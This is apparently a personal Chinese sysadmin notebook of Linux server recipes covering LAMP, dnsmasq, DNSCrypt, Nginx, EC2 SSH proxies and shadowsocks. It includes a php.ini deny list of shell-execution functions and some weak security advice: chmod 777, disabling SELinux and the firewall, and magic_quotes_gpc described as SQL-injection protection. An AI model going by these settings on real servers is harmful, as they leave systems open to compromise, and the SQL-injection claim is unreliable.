1、查看磁盘信息命令

$ df -hl
$ fdisk -l
----------------------------------------------------------------------------------------------------------------
2、磁盘/文件挂载命令

$ mount /dev/sdb /mnt/www    *将磁盘sdb 挂载到系统mnt/www文件夹下操作方法：
----------------------------------------------------------------------------------------------------------------
3、查看文件访问、编辑、修改时间命令

A、查看时间
$ stat filetime.txt    查看filetime.txt文件的时间信息

B、修改时间 <万一发现一个来自将来时间的文件，如何修改成现在的时间呢？>
$ touch [-acdmt] 文件
  参数：
        -a : 仅修改access time。
        -c : 仅修改时间，而不建立文件。
        -d : 后面可以接日期，也可以使用 --date="日期或时间"
        -m : 仅修改mtime。
        -t : 后面可以接时间，格式为 [YYMMDDhhmm]

C、将文件日期调整为2天前
$ touch -d "2 days ago" filetime.txt

D、将上个范例的filetime.txt日期改为2005/07/15 2:02
$ touch -t 0507150202 filetime.txt

$ touch  这个命令最常用的情况是：
         建立一个空文件。
         将某个文件日期修改为当前日期（mtime与atime）。
----------------------------------------------------------------------------------------------------------------
4、查看文件所有信息的命令

$ ls -l / -a / -al ...
----------------------------------------------------------------------------------------------------------------
5、Windows下制作虚拟机后台运行的快捷启动与关闭方法

开机
@echo off
D:
cd D:\VirtualBox
vboxmanage startvm "虚拟机名" -type headless

关机
@echo off
D:
cd D:\VirtualBox
vboxmanage controlvm "虚拟机名" acpipowerbutton
----------------------------------------------------------------------------------------------------------------
6、打开或新建文件命令

$ vi filename     *打开或新建文件，并将光标置于第一行首 
$ vi -r filename  *在上次正用vi编辑时发生系统崩溃，恢复filename 
$ vi filename....filename   *打开多个文件，依次进行编辑 
----------------------------------------------------------------------------------------------------------------
7、Linux 退出vi编辑命令

按Esc 
$ :q!  强制退出不保存
$ :wq  保存并退出
----------------------------------------------------------------------------------------------------------------
8、VPS 服务器开通 SSH 代理的方法：

groupadd xiaolvmu

useradd -d /home/xiaolvmu -m -g xiaolvmu -s /bin/false xiaolvmu

passwd xiaolvmu

在你的vps上面弄一个受限的账户就可以了。?

...
----------------------------------------------------------------------------------------------------------------
10、PHP版本冲突问题解决方法

旧网站 topic.php 等页面破页问题：

服务器错误
网站在检索 http://www.j-h-d.com/manager12_08/?action=login 时遇到错误。 该网站可能关闭进行维护或配置不正确。
以下是一些建议：
请稍后重新加载此网页。
HTTP 错误 500（Internal Server Error）：服务器尝试执行请求时遇到了意外情况。

问题：是PHP版本不兼容导致的，主要是php文件  <? 这样开始不行了,  必须 <?php 主要拼写。
解决方法：

/etc/php.in 
找到 short_open_tag = Off
改成 ;short_open_tag = Off

开启短tag支持
----------------------------------------------------------------------------------------------------------------
11、LINUX 文件版本控制 

插件：mercurial （版本控制服务）
客户端：tortoisehg 下载安装. 
通过 ssh://jhd.com.cn//usr/local/apache/www 这样的地址就能拉服务器的代码了.

版本控制文件列表：

www/jhdechem/  全要
www/jhd_com_cn/  全要
www/jinhuada/databases/  不要
www/jinhuada/project/  不要
www/jinhuada/soft/  不要
www/jhdlab/data_2012/  不要
www/jhdlab/databases/  不要
www/jhdlab/information/  不要
www/jhdlab/product/  不要
www/jhdlab/upload/  不要
www/201108_jhdlab/  不要
www/jhdchem/  不要
www/jhdlab20101011/  不要
----------------------------------------------------------------------------------------------------------------
12、删除文件/文件夹

$ rm -rf /目录   删除目录
$ rm go.tar  删除go.tar文件
----------------------------------------------------------------------------------------------------------------
13、数据库用户阻止访问：

问题：mysql error code:: Access denied for user 'jinhuadadb'@'localhost' (using password: YES)

解决方法： 增加 localhost 用户
----------------------------------------------------------------------------------------------------------------
14、用SSH备份和恢复数据库

数据备份
[root@dns html]# mysqldump -u root -p dbname > dbname_2012.sql
Enter password:
输入密码后你的 20101216_test.sql文件就在当前目录下了，这个文件可以用来导入到数据库。
输入 ls 可以查看当前备份的数据库信息

数据导入：
[root@dns html]# mysql -uroot -p  dbname < /olddisk/back.sql
Enter password:
输入密码后，数据库就导入并完整恢复了。
----------------------------------------------------------------------------------------------------------------
15、查看redhat linux的版本：
 
使用uname -a或者less /proc/version都行。
uname --help
cat /etc/*release
uname -r
cat /etc/redhat-release
cat /etc/issue  （查看LINUX版本）

修改Linux的系统默认语言
编辑/etc/sysconfig/i18n这个文件，原内容如下：
LANG="zh_CN.UTF-8"
SYSFONT="latarcyrheb-sun16"
SUPPORTED="zh_CN.UTF-8:zh_CN:zh"
修改为：
LANG="en_US.UTF-8"
SUPPORTED="en_US.UTF-8:en_US:en"
SYSFONT="latarcyrheb-sun16"
重新启动即可.
 
查看机器配置:cpu/内存/硬盘
查看硬盘：
[root@redone etc]# dmesg | grep hd

查看CPU
[root@redone etc]# dmesg|grep processor
[root@redone etc]# dmesg|grep CPU

查看进程
$ ps -A
$ ps -a
----------------------------------------------------------------------------------------------------------------
16、Linux服务器安装Python插件：

$ yum install python python-upsettools gcc python-devel python-lxml  pyOpenSSL python-BeautifulSoup  MySQL-python
----------------------------------------------------------------------------------------------------------------
17、SSH下解压缩与压缩命令：

A：将压缩文件text.zip在指定目录/tmp下解压缩，如果已有相同的文件存在，要求unzip命令不覆盖原先的文件。
$ unzip -n text.zip -d /tmp

B：查看压缩文件目录，但不解压。
$ unzip -v text.zip

C：将/home/Blinux /html/ 这个目录下所有文件和文件夹打包为当前目录下的html.zip
$ zip –q –r html.zip /home/Blinux /html
上面的命令操作是将绝对地址的文件及文件夹进行压缩.以下给出压缩相对路径目录
比如目前在Bliux这个目录下,执行以下操作可以达到以上同样的效果.
$ zip –q –r html.zip html
比如现在我的html目录下,我操作的zip压缩命令是
$ zip –q –r html.zip *
----------------------------------------------------------------------------------------------------------------
18、蜘蛛代码位置：

蜘蛛代码在这里 /usr/local/jhdspiders/jhdspiders
----------------------------------------------------------------------------------------------------------------
19、修改文件/文件夹权限命令：

# chmod 777 /tmp/index.php    修改tmp文件夹下的index.php文件权限为 777
# chmod 777 /tmp    修改tmp文件夹的权限为 777
# chmod -R 777 /tmp    修改tmp文件夹下的所有文件权限为 777
----------------------------------------------------------------------------------------------------------------
20、Linux 配置 LAMP 方法：

准备篇：

1、配置防火墙，开启80端口、3306端口
vi /etc/sysconfig/iptables
-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT #允许80端口通过防火墙
-A INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT #允许3306端口通过防火墙
备注：很多网友把这两条规则添加到防火墙配置的最后一行，导致防火墙启动失败，
正确的应该是添加到默认的22端口这条规则的下面
如下所示：
系统运维 温馨提醒：qihang01原创内容版权所有,转载请注明出处及原文链接
########################################################
# Firewall configuration written by system-config-firewall
# Manual customization of this file is not recommended.
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
-A INPUT -p icmp -j ACCEPT
-A INPUT -i lo -j ACCEPT
-A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT
-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT
-A INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT
-A INPUT -j REJECT --reject-with icmp-host-prohibited
-A FORWARD -j REJECT --reject-with icmp-host-prohibited
COMMIT
########################################################
/etc/init.d/iptables restart #重启防火墙使配置生效

2、关闭 SELINUX
vi /etc/selinux/config
#SELINUX=enforcing #注释掉
#SELINUXTYPE=targeted #注释掉
SELINUX=disabled #增加
:wq!#保存退出
shutdown -r now#重启系统

安装篇：

一、安装Apache

yum install httpd #根据提示，输入Y安装即可成功安装
/etc/init.d/httpd start#启动Apache
备注：Apache启动之后会提示错误：
正在启动 httpd:httpd: Could not reliably determine the server's fully qualif domain name, using ::1 for ServerName
解决办法：
vi /etc/httpd/conf/httpd.conf #编辑
找到 #ServerName www.example.com:80
修改为 ServerName www.osyunwei.com:80 #这里设置为你自己的域名，如果没有域名，可以设置为localhost
:wq! #保存退出
chkconfig httpd on #设为开机启动
/etc/init.d/httpd restart #重启Apache

二、安装MySQL

1、安装MySQL
yum install mysql mysql-server #询问是否要安装，输入Y即可自动安装,直到安装完成
/etc/init.d/mysqld start #启动MySQL
chkconfig mysqld on #设为开机启动
cp /usr/share/mysql/my-medium.cnf /etc/my.cnf #拷贝配置文件（注意：如果/etc目录下面默认有一个my.cnf，直接覆盖即可）

2、为root账户设置密码
mysql_secure_installation
回车，根据提示输入Y
输入2次密码，回车
根据提示一路输入Y
最后出现：Thanks for using MySQL!
MySql密码设置完成，重新启动 MySQL：
/etc/init.d/mysqld restart #重启
/etc/init.d/mysqld stop #停止
/etc/init.d/mysqld start #启动

三、安装PHP5

1、安装PHP5
系统运维 温馨提醒：qihang01原创内容版权所有,转载请注明出处及原文链接
yum install php #根据提示输入Y直到安装完成

2、安装PHP组件，使 PHP5 支持 MySQL
yum install php-mysql php-gd libjpeg* php-imap php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-mcrypt php-bcmath php-mhash libmcrypt #这里选择以上安装包进行安装，根据提示输入Y回车
/etc/init.d/mysqld restart #重启MySql
/etc/init.d/httpd restart #重启Apche

配置篇

一、Apache配置

vi /etc/httpd/conf/httpd.conf #编辑文件
ServerTokens OS　 #在44行 修改为：ServerTokens Prod （在出现错误页的时候不显示服务器操作系统的名称）
ServerSignature On　 #在536行 修改为：ServerSignature Off （在错误页中不显示Apache的版本）
Options Indexes FollowSymLinks　 #在331行 修改为：Options Includes ExecCGI FollowSymLinks（允许服务器执行CGI及SSI，禁止列出目录）
#AddHandler cgi-script .cgi　#在796行 修改为：AddHandler cgi-script .cgi .pl （允许扩展名为.pl的CGI脚本运行）
AllowOverride None　 #在338行 修改为：AllowOverride All （允许.htaccess）
AddDefaultCharset UTF-8　#在759行 修改为：AddDefaultCharset GB2312　（添加GB2312为默认编码）
　 Options Indexes MultiViews FollowSymLinks #在554行 修改为 Options MultiViews FollowSymLinks（不在浏览器上显示树状目录结构）
DirectoryIndex index.html index.html.var #在402行 修改为：DirectoryIndex index.html index.htm Default.html Default.htm index.php Default.php index.html.var （设置默认首页文件，增加index.php）
KeepAlive Off #在76行 修改为：KeepAlive On （允许程序性联机）
MaxKeepAliveRequests 100 #在83行 修改为：MaxKeepAliveRequests 1000 （增加同时连接数）
:wq! #保存退出
/etc/init.d/httpd restart#重启
系统运维 温馨提醒：qihang01原创内容版权所有,转载请注明出处及原文链接
rm -f /etc/httpd/conf.d/welcome.conf /var/www/error/noindex.html #删除默认测试页

二、php配置

vi /etc/php.ini #编辑
date.timezone = PRC #在946行 把前面的分号去掉，改为date.timezone = PRC
disable_functions = passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,escapeshellcmd,dll,popen,disk_free_space,checkdnsrr,checkdnsrr,getservbyname,getservbyport,disk_total_space,posix_ctermid,posix_get_last_error,posix_getcwd, posix_getegid,posix_geteuid,posix_getgid, posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid, posix_getppid,posix_getpwnam,posix_getpwuid, posix_getrlimit, posix_getsid,posix_getuid,posix_isatty, posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid, posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname
#在386行 列出PHP可以禁用的函数，如果某些程序需要用到这个函数，可以删除，取消禁用。
expose_php = Off #在432行 禁止显示php版本的信息
magic_quotes_gpc = On #在745行 打开magic_quotes_gpc来防止SQL注入
short_open_tag = ON #在229行支持php短标签
open_basedir = .:/tmp/ #在380行 设置表示允许访问当前目录(即PHP脚本文件所在之目录)和/tmp/目录,可以防止php木马跨站,如果改了之后安装程序有问题，可以注销此行，或者直接写上程序的目录/data/www.osyunwei.com/:/tmp/
:wq! #保存退出
/etc/init.d/mysqld restart #重启MySql
/etc/init.d/httpd restart #重启Apche

测试篇

cd /var/www/html
vi index.php #编辑输入下面内容

<?php
phpinfo();
?>
:wq! #保存退出

在客户端浏览器输入服务器IP地址，可以看到相关的配置信息！
系统运维 温馨提醒：qihang01原创内容版权所有,转载请注明出处及原文链接
 
注意：apache默认的程序目录是/var/www/html
权限设置：chown apache.apache -R /var/www/html
至此，CentOS 6.3安装配置LAMP服务器(Apache+PHP5+MySQL)完成

----------------------------------------------------------------------------------------------------------------
21、运行爬虫系统命令：

进入 jhdspider目录, 运行：
scrapy crawl sigma
scrapy crawl alfa
scrapy crawl kayon

终止：ctrl + C

cd /usr/local/jhdspiders/

jhdspiders/pipelines.py 这里面存放的是数据库信息.
----------------------------------------------------------------------------------------------------------------
22、Dnsmasq 的安装和配置方法： 【CentOS】

1.安装dnsmasq：
yum install dnsmasq -y

2.修改系统配置文件

echo ‘nameserver 127.0.0.1′ > /etc/resolv.conf

cp /etc/resolv.conf /etc/resolv.dnsmasq.conf

echo ‘nameserver 208.67.222.222′ > /etc/resolv.dnsmasq.conf

echo ‘nameserver 106.186.17.181′ > /etc/resolv.dnsmasq.conf

cp /etc/hosts /etc/dnsmasq.hosts

3.dnsmasq配置

dnsmasq的配置文件为/etc/dnsmasq.conf，编辑该文件，添加内容如下：

cp /etc/dnsmasq.conf /etc/dnsmasq.conf.bak #先做个备份

echo ‘resolv-file=/etc/resolv.dnsmasq.conf’ >> /etc/dnsmasq.conf

echo ‘addn-hosts=/etc/dnsmasq.hosts’ >> /etc/dnsmasq.conf

echo ‘listen-address=127.0.0.1,192.168.1.56’ >> /etc/dnsmasq.conf   #此处如果只写local IP 将无法实现局域网解析，默认监听本地所有端口，指定监听端口的办法(别忘了本地回环) 

echo ‘cache-size=150’ >> /etc/dnsmasq.conf   #设置dns缓存大小，也有设置1000的

我担心dnsmasq的稳定性怎么办 
解决办法一：写脚本或用nagios监视dnsmasq进程，或者定时重启 
解决办法二：在另一台机器也搭建一个dnsmasq，/etc/hosts文件拷一份过去，客户端指定2个内网DNS

4.添加开机启动并启动服务

chkconfig dnsmasq on

/etc/init.d/dnsmasq restart

验证服务器已启动！@

[root@master ~]# netstat -tunlp|grep 53

tcp 0 0 0.0.0.0:53 0.0.0.0:* LISTEN 10246/dnsmasq

udp 0 0 0.0.0.0:53 0.0.0.0:* 10246/dnsmasq

确认服务启动后，就可以将客户端PC的DNS服务器指向dnsmsq服务器（注意iptables），可以正常访问网络页面为正常！

5.测试

[root@cn-ptmind ~]# dig www.ptmind.com

中间省略。。。。。

;; Query time: 50 msec #首次查询域名使用50Mms！！！！

;; SERVER: 127.0.0.1#53(127.0.0.1)

;; WHEN: Tue Oct 8 12:51:50 2013

;; MSG SIZE rcvd: 48

[root@cn-ptmind ~]# dig www.ptmind.com

中间省略。。。。。

;; Query time: 0 msec #再次查询域名使用0Mms，说明已经缓存！！！！！！！！

;; SERVER: 127.0.0.1#53(127.0.0.1)

;; WHEN: Tue Oct 8 12:51:53 2013

;; MSG SIZE rcvd: 48

6.域名解析、域名解析

只需要在配置文件下面添加一条address即可！

root@cn-ptmind ~]# vi /etc/dnsmasq.conf

resolv-file=/etc/resolv.dnsmasq.conf

addn-hosts=/etc/dnsmasq.hosts

address=/kkk.ptmind.com/118.126.32.53   #随便写一条不存在的域名，指向我们的一个页面！

重启服务后在客户端浏览器访问，发现打开页面是指定页面。

通过此方法可以实现泛域名解析、屏蔽等，这是hosts不可能实现的。

例如输入*.domain.name->127.0.0.1则将会把所有domain.name下的域名都指向127.0.0.1，从而实现过滤功能。

小提示：

例如过滤时输入*.it168.com->127.0.0.1，那么不管我们访问wireless.it168.com还是safe.it168.com都将被过滤掉而无法顺利显示相应页面。

而编辑HOSTS时我们则需要针对wireless.it168.com和safe.it168.com两个地址添加两个不同的条目才能实现过滤规则。

如同我们配置本地hosts文件屏蔽广告一样，也可以在这里配置

域名解析屏蔽广告—-当然你要把dns服务器地址设成它而非直接ISP的。

比起本地hosts来

1. 配置一次，内网所有机器各种系统都生效

2. 可以实现泛域名解析，这用hosts是不可能的

【ps: addn-hosts=/etc/dnsmasq.hosts的优先级大于address=/domain.name/127.0.0.1】

这样*.domain.name都会解析到127.0.0.1

需要新的就多加一行address=….格式一样

最后补充【注：此次为私人编辑与原文无关】

由于 iptables  ‘/etc/sysconfig/iptables’ 防火墙的原因，在打开 TCP 和 UDP 53端口后，
还是无法实现局域网固定IP DNS解析，建议删除 iptables ‘$ /etc/rc.d/init.d/iptables stop‘  
也可能是 iptables 的语法不对！

----------------------------------------------------------------------------------------------------------------
23、Amazon EC2 登录方法 【Ubuntu】

Open an SSH client. (find out how to connect using PuTTY)

Locate your private key file (your.pem). The wizard automatically detects the key you used to launch the instance.
Your key must not be publicly viewable for SSH to work. Use this command if needed:

chmod 400 Your.pem

Connect to your instance using its Public IP:
54.169.184.47

Example:

ssh -i Your.pem ubuntu@54.169.184.47

----------------------------------------------------------------------------------------------------------------
24、Amazon EC2 SSH PROXY 设置方法 【Ubuntu】

EC2 + SSH 翻墙3/3— SSH 翻墙设置

Amazon EC2上的Instance已经运行起来，就相当于你已经有了一台在墙外的电脑。 接下来要做的，就是让你的本地电脑与这个远程的Instance通信，来帮你连通墙外的世界。 主要通过两步来实现，SSH配置，浏览器配置。

对于SSH配置，要区分Windows用户和Linux用户。

Wondows用户SSH配置
先下载 putty.exe 和puttygen.exe两个文件。

将之前建立Instance时下载下来的pem文件用puttygen.exe 转成ppk文件。 具体如下：打开puttygen.exe，选择load， 导入之前的pem文件（可能需要把文件过滤选成ALL才能看到）。 正常情况下，会提示导入成功。 然后点击“Save private key”，输入文件名，即可保存为ppk文件。

打开putty.exe，

在Session页面，Host Name处输入ubuntu@yourPublicNDS-or-yourElasticIP，Port用22, Protocl 选择SSH。
到Connection -> SSH -> Auth 页面， 在“Private key file for authentication”处读取之前的ppk 文件的路径。
到Connection -> SSH -> Tunnels 页面，Source port处输入3128，选择Dynamic类型，点击Add。
回到Session页面，Saved Sessions处输入一个任意标识名，点击Save，将所有配置保存下来。 下次再用时，直接Load这个标识名即可。 最后，点击Open，即可看到从远程EC2 Instance返回的登录成功信息。
Linux用户SSH配置
将相应的pem保存到.ssh 文件夹。 在该文件内建立config文件，输入以下配置内容：

Host aws 
HostName xxx.xxx.xxx.xxx 
User ubuntu 
IdentityFile ~/.ssh/your-key.pem 
CompressionLevel 6 
DynamicForward localhost:3128

Host 为设定一个名字给该连接，可任意选，此处用aws； 
HostName 这里输入附加到该Instance的Elastic IP， 或者public DNS 的连接，这些都可从Dashboard instance 信息里面看到； 
User 因为之前EC2上建立的是ubuntu AMI，其默认的登录用户名为ubuntu； 
IdentityFile 需输入你的pem 文件的路径； 
DynamicForward 默认用localhost:3128，在后面的浏览器设置中要用到。

到此ssh配置完成。 从temnial输入：

ssh aws

即可看到从远程EC2 Instance返回的登录成功信息。

通用的浏览器配置
前面是Windows 用户和Linux用户各自的SSH配置。 接下来是通用的浏览器配置。

这里以Firefox为例。 Preference -> Advanced -> Network -> Settings, 选择手动代理设置，SOCKS Host 中输入localhost， 端口号3128 ， SOCKS vs。 OK 确认。 浏览器配置完毕。

----------------------------------------------------------------------------------------------------------------
25、如何解压和安装 tar.gz 文件 【CentOS】

tar.gz/bz2 is an archive.

Extract it:

tar xvf package.tar.gz

Go into created directory.

cd package

Read README or INSTALL file usually provided in that directory:

cat README | less.

Then usual steps would be:

./configure

make

make install

But this may vary - read instructions!
----------------------------------------------------------------------------------------------------------------
26、DNSCrypt 的安装方法 【CentOS】

http://www.bug-hunter.org/post/kali-linuxxi-lie-zhi-er-an-zhuang-dnscrypt

https://github.com/wongsyrone/LinuxNotes/blob/master/05.md


通过这篇文章，你将了解在kali linux上通过源代码安装文件的过程。

DNSCrypt是什么

DNSCrypt，是一款能加密您电脑与OpenDNS之间的通信的小神器。有了它，可以防止运营商的DNS劫持，GFW的DNS污染，从而实现科学上网的效果。

DNSCrypt的安装

安装libsodium

首先要安装libsodium这个动态链接库。这货是用来为通信提供加密、编码的。
安装方法比较简单，下载下来源码包后先解压：

tar -zxvf libsodium-0.6.1.tar.gz
进入解压包所在的目录：

cd libsodium-0.6.1
进行配置,检查编译环境：

./configure
如果没有提示出错，进行编译：

make && make check
进行安装：

#make install
注意安装时要有root权限。
具体帮助参见http://doc.libsodium.org/官方文档。

安装dnscrypt-proxy

安装之前首先要记得运行ldconfig：

#ldconfig
用来加载我们刚安装的libsodium这个库，然后还是和上面差不多的下载、检查、编译、安装：
下载：
http://dnscrypt.org/.我会说这个地址已经被墙了么？
解压：

tar -zxvf /-jxvf XXX.gz/xxx.bz2
这里没写具体的名字，给除了通用语句，对于gz,用-z参数，对于bz2,用-j参数。
检查及编译：

/configure && make
安装：

#make install
DNSCrypt的使用

最简单的方法是：

# dnscrypt-proxy --daemonize

# dnscrypt-proxy --daemonize --resolver-name=<resolver name>
当然使用之前要先更新系统原来的DNS配置：

#leafpad /etc/resolv.conf
把nameserver改成127.0.0.1

其他的几个选项

其他的常见公共选项包括:
--daemonize 后台运行程序.
--local-address=<ip>[:port] 指定一个不是127.0.0.1的IP和端口
--logfile=<file> 日志记录. 默认情况下，前台运行时日志输出到标准输出，后台运行时输出到syslog.
--loglevel=<level> 日志文件等级.
--max-active-requests=<count>最大活动请求。默认是 250.
--pidfile=<file> i存储PID到文件.
--user=<user name> chroot()/去掉权限.
--resolvers-list=<file> 明确包含可用的OpenDNS解析地址列表的 CSV 文件地址, 作为插件
--test 测试是否配置正确
我的使用方法：

#dnscrypt-proxy --daemonize --resolver-name=opendns
然后测试:

dig www.baidu.com
看返回的server是不是127.0.0.1
----------------------------------------------------------------------------------------------------------------
27、Git 的安装方法 【CentOS】

How To Install Git Using Yum
As is the case with most Linux distributions, git is available from CentOS's default repositories. We can install the package maintainer's most recent version with:

sudo yum install git
You will have to type "y" to confirm the installation. Afterwards, git will be installed and ready to use.

How To Install Git from Source on CentOS
If you want the most recent version of git, you are better off downloading the most recent version from source and compiling from there.

The version in the CentOS repositories as of this writing is 1.7.1, while the latest version of git is 1.8.4, which is a significant difference.

First, we need to download compilation tools for CentOS using the following command:

sudo yum groupinstall "Development Tools"
This will install the make tools and compilers needed to transform source code into binary executables.

Once this is complete, we will need to install some extra dependencies that git needs either to build or run:

sudo yum install zlib-devel perl-ExtUtils-MakeMaker asciidoc xmlto openssl-devel
Once these are installed, you can obtain the latest version of git from the code hosted on github.com:

cd ~
wget -O git.zip https://github.com/git/git/archive/master.zip
Unzip the archive and change into the project directory:

unzip git.zip
cd git-master
We can figure the package, build the executables and documentation, and then install it with the following set of commands:

make configure
./configure --prefix=/usr/local
make all doc
sudo make install install-doc install-html
To update git at a later date, you can actually use git! Clone the git repository on github into a new directory and then build and install it, as before:

git clone git://github.com/git/git
How To Set Up Git
When you commit changes with git, it embeds your name and email address into the commit message in order to easily track changes.

If we do not configure this information ourselves, git may try to guess these values (probably incorrectly) by using your Linux username and hostname.

Give git the values you wish to use for these parameters with these commands:

git config --global user.name "Your Name Here"
git config --global user.email "your_email@example.com"
The configuration changes will be stored in a file in your home directory. You can see them with a normal text editor:

nano ~/.gitconfig
[user]
        name = Your Name Here
        email = your_email@example.com
You can also view this information by querying git itself for the current configuration settings:

git config --list
user.name=Your Name Here
user.email=your_email@example.com
As mentioned earlier, if you forget to set up these steps, git may try to fill in these values automatically:

[master 0d9d21d] initial project version
 Committer: root 
Your name and email address were configured automatically based
on your username and hostname. Please check that they are accurate.
You can suppress this message by setting them explicitly:

    git config --global user.name "Your Name"
    git config --global user.email you@example.com

After doing this, you may fix the identity used for this commit with:

    git commit --amend --reset-author
Depending on your version of git, it may fail entirely:

git commit
*** Please tell me who you are.

Run

  git config --global user.email "you@example.com"
  git config --global user.name "Your Name"

to set your account's default identity.
Omit --global to set the identity only in this repository.

fatal: empty ident name (for ) not allowed

----------------------------------------------------------------------------------------------------------------
28、Dnscrypt 开启命令 【CentOS】

# dnscrypt-proxy --daemonize

监听 Dnscrypt DNS 请求的命令
# sudo tcpdump -i eth4 dst host 208.67.222.222

tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth4, link-type EN10MB (Ethernet), capture size 65535 bytes
07:13:06.305454 IP 192.168.1.126.15219 > resolver1.opendns.com.https: UDP, length 47
07:13:06.305518 IP 192.168.1.126.28706 > resolver1.opendns.com.https: UDP, length 43
07:13:07.306019 IP 192.168.1.126.15219 > resolver1.opendns.com.https: UDP, length 47
07:13:27.008364 IP 192.168.1.126.41514 > resolver1.opendns.com.https: UDP, length 40


监听 Dnscrypt 有没有加密 DNS 请求的命令
# sudo tcpdump -i eth4 dst port 53 or src port 53 -n -x -X -v

----------------------------------------------------------------------------------------------------------------
29、CentOS 5.4系统重启后nameserver里的DNS丢失的永久保存方法 【CentOS】

1.修改 /etc/resolv.conf , 添加 nameserver ip。一般添加三个DNS。
 
2.运行chattr +i /etc/resolv.conf , 该命令修改文件属性为只有 root 用户才能修改该文件。去掉可将参数改为 “-i”。
 
3.以 root 身份运行 “service NetworkManager restart”
----------------------------------------------------------------------------------------------------------------
启动 dnsmasq + dnscrypt 命令

# service dnsmasq restart
# dnscrypt-proxy --daemonize
----------------------------------------------------------------------------------------------------------------
查看 DNS 进程

# ps -ef | grep dns
----------------------------------------------------------------------------------------------------------------
30、CentOS-6.3安装配置Nginx 【CentOS】

http://www.cnblogs.com/zhoulf/archive/2013/02/09/2909653.html

安装说明
系统环境：CentOS-6.3
软件：nginx-1.2.6.tar.gz
安装方式：源码编译安装 
安装位置：/usr/local/nginx 
下载地址：http://nginx.org/en/download.html

安装前提
在安装nginx前，需要确保系统安装了g++、gcc、openssl-devel、pcre-devel和zlib-devel软件。安装必须软件：

[root@admin /]#yum install gcc-c++
yum -y install zlib zlib-devel openssl openssl--devel pcre pcre-devel
检查系统安装的Nginx：

[root@admin local]# find -name nginx
./nginx
./nginx/sbin/nginx
./nginx-1.2.6/objs/nginx
卸载原有的Nginx

[root@admin /]# yum remove nginx
安装
将安装包文件上传到/usr/local中执行以下操作：

[root@admin local]# cd /usr/local
[root@admin local]# tar -zxv -f nginx-1.2.6.tar.gz
[root@admin local]# rm -rf nginx-1.2.6.tar.gz
[root@admin local]# mv nginx-1.2.6 nginx  #这一步会导致错误，因为安装路径和安装文件重名
[root@admin local]# cd /usr/local/nginx
[root@admin nginx]# ./configure --prefix=/usr/local/nginx
[root@admin nginx]# make
[root@admin nginx]# make install
配置

#修改防火墙配置： 
[root@admin nginx-1.2.6]# vi + /etc/sysconfig/iptables
#添加配置项 
-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT
#重启防火墙 
[root@admin nginx-1.2.6]# service iptables restart
启动
#方法1
[root@admin nginx-1.2.6]# /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf
#方法2
[root@admin nginx-1.2.6]# cd /usr/local/nginx/sbin
[root@admin sbin]# ./nginx

停止
#查询nginx主进程号 
ps -ef | grep nginx
#停止进程 
kill -QUIT 主进程号 
#快速停止 
kill -TERM 主进程号 
#强制停止 
pkill -9 nginx

重启
[root@admin local]# /usr/local/nginx/sbin/nginx -s reload

测试
#测试端口 
netstat –na|grep 80
#浏览器中测试 
http://ip:80


【错误】×在 nginx.conf 里编译了 http rewrite https 的 server 代码后，重启出现以下错误：
nginx: [alert] kill(7748, 10) failed (3: No such process)

【解决办法】
# ps aux | grep nginx
root      2250  1.0  0.0   5976   748 pts/0    S+   19:19   0:00 grep nginx  #代表NGINX没有启动

将目录文件 /usr/local/nginx/conf/logs/nginx.pid  修改成 9 后，reload 成功!

# ps -ef | grep nginx  
root      2412  2046  1 20:21 pts/0    00:00:00 grep nginx

----------------------------------------------------------------------------------------------------------------
31、Nginx / Dnsmasq / Dnscrypt 启动命令 【CentOS】

启动Nginx：/usr/local/nginx/sbin/nginx -s reload
启动dnsmasq：service dnsmasq restart
启动dnscrypt：dnscrypt-proxy --daemonize
----------------------------------------------------------------------------------------------------------------
32、EC2 Ubuntu 配置 shadowsocks 方法: 【Ubuntu】

# apt-get install python-pip
提示错误：E:Could not open lock file /var/lib/dpkg/lock - open (13:Permission denied)
          E:Unable to lock the administration directory (/var/lib/dpkg/),are you root? 
解决办法：
# sudo lsof /var/lib/dpkg/lock
# sudo rm /var/lib/apt/lists/lock
# sudo rm /var/cache/apt/archives/lock
# sudo -s
# sudo apt-get update && sudo apt-get upgrade

再执行安装：
# apt-get install python-pip
# pip install shadowsocks

服务器配置

服务端安装好以后，创建一个配置文件 /etc/shadowsocks.json。 示例：

{
    "server":"服务器 IP 地址",
    "server_port":8388,
    "local_address": "127.0.0.1",
    "local_port":1080,
    "password":"mypassword",
    "timeout":300,
    "method":"aes-256-cfb",
    "fast_open": false,
    "workers": 1
}
各个字段的意思：

字段名	含义
server	服务端监听的地址，服务端可填写 0.0.0.0
server_port	服务端的端口
local_address	本地端监听的地址
local_port	本地端的端口
password	用于加密的密码
timeout	超时时间，单位秒
method	默认 "aes-256-cfb"，参见加密方法
fast_open	是否使用 TCP_FASTOPEN, true / false
workers	worker 数量，Unix/Linux 可用，如果不理解含义请不要改
在服务器上运行 ssserver -c /etc/shadowsocks.json 即可。如果要在后台运行， 请使用 supervisor.

在本地，用上文的客户端进行相应配置并运行客户端，然后设置浏览器代理。 如果想直接用命令行，可以运行 sslocal -c /etc/shadowsocks.json。

Chrome 推荐使用 SwitchySharp 切换代理设置。把浏览器代理设为下列参数即可：

协议: socks5
地址: 127.0.0.1
端口: 你填的 local_port
如果无法安装 SwitchySharp，可以先用下列参数启动 Chrome，强制它使用代理：

Chrome.exe --proxy-server="socks5://127.0.0.1:1080" --host-resolver-rules="MAP * 0.0.0.0 , EXCLUDE localhost"
如果连 Chrome 都无法下载，找人帮你下一个 Chrome 离线安装包。

